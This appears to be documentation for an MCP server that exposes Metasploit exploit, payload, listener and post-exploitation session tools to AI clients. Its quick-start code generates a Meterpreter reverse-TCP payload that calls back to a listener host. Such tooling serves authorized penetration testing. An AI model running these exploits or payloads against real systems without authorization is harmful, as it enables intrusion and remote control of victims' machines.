Available Tools

Discovery

  • list_exploits - Search exploit modules
  • list_payloads - Browse available payloads
  • list_active_sessions - View active sessions
  • list_listeners - Check running handlers

Exploitation

  • run_exploit - Execute exploit modules
  • generate_payload - Create custom payloads
  • start_listener - Set up handlers
  • run_auxiliary_module - Run aux modules

Post-Exploitation

  • run_post_module - Execute post modules
  • send_session_command - Run session commands
  • terminate_session - Close sessions
  • stop_job - Manage running jobs

Quick Start Guide

1

Connect Your Client

Use any MCP-compatible client to connect to the server:

// Using the MCP SDK
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { SSEClientTransport } from '@modelcontextprotocol/sdk/client/sse.js';

const transport = new SSEClientTransport(
    new URL('http://your-server:8085/sse')
);

const client = new Client({
    name: 'your-client',
    version: '1.0.0'
});

await client.connect(transport);
2

List Available Tools

Discover all available Metasploit tools:

const tools = await client.listTools();
tools.tools.forEach(tool => {
    console.log(`${tool.name}: ${tool.description}`);
});
3

Execute Tools

Call any tool with appropriate parameters:

// Search for exploits
const result = await client.callTool('list_exploits', {
    search_term: 'apache'
});

// Generate a payload
const payload = await client.callTool('generate_payload', {
    payload_type: 'linux/x64/meterpreter/reverse_tcp',
    format_type: 'elf',
    options: {
        LHOST: '10.0.0.1',
        LPORT: 4444
    }
});

Configuration

The server can be configured using environment variables:

# Metasploit RPC Configuration
MSF_PASSWORD=yourpassword      # RPC password
MSF_SERVER=127.0.0.1          # RPC server address
MSF_PORT=55553                # RPC port
MSF_SSL=false                 # Use SSL for RPC

# Server Configuration
PAYLOAD_SAVE_DIR=/app/payloads  # Where to save generated payloads
LOG_LEVEL=INFO                  # Logging level
